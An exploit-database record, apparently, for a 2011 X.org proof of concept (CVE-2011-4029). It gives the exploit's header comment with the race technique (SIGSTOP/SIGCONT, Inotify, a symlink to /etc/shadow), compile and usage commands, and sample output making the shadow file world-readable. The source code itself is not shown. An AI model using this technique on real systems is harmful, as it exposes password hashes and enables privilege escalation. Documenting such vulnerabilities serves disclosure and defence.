{
    "text": "date_time:Dec 16, 2011 ， title:X.org File Permission Change Proof Of Concept  ， detail:This proof of concept exploit sets permissions to 444 on an arbitrary file specified as an argument by leveraging SIGSTOP/SIGCONT signals and the Inotify API to win a race condition in X.  ， cve:advisories | CVE-2011-4029  ， date_time:Dec 16, 2011  ， desc:/* xchmod.c - Xorg file permission change vulnerability PoC  ， This PoC exploits CVE-2011-4029 to set the rights 444 (read for all) on  ， arbitrary file specified as argument (default file is \"/etc/shadow\").  ， It uses SIGSTOP/SIGCONT signals and the Inotify API to win the race.  ， Made for EDUCATIONAL PURPOSES ONLY!  ， On some configurations, this exploit must be launched from a TTY (switch  ， by typing Ctrl-Alt-Fn). But not on Debian, because it bypasses the X  ， wrapper permission thanks to CVE-2011-4613!  ， Tested on Debian 6.0.3 up to date with X default configuration issued  ， from the xserver-xorg-core package (version 2:1.7.7-13).  ， Compile: cc xchmod.c -o xchmod  ， Usage: ./xchmod [/path/to/file] (default file is /etc/shadow)  ， $ ls -l /etc/shadow  ， -rw-r- 1 root shadow 1072 Aug 7 07:10 /etc/shadow  ， $ ./xchmod  ， [+] Trying to stop a Xorg process right before chmod()  ， [+] Process ID 4134 stopped (SIGSTOP sent)  ， [+] Removing /tmp/.tX1-lock by launching another Xorg process  ， [+] Creating evil symlink (/tmp/.tX1-lock -> /etc/shadow)  ， [+] Process ID 4134 resumed (SIGCONT sent)  ， [+] Attack succeeded, ls -l /etc/shadow:  ， -r-r-r- 1 root shadow 1072 Aug 7 07:10 /etc/shadow  ，  ， \"THE BEER-WARE LICENSE\" (Revision 42):  ， <vladz@devzero.fr> wrote this file. As long as you retain this notice  ， you can do whatever you want with this stuff. If we meet some day, and  ， you think this stuff is worth it, you can buy me a beer in return. -V."
}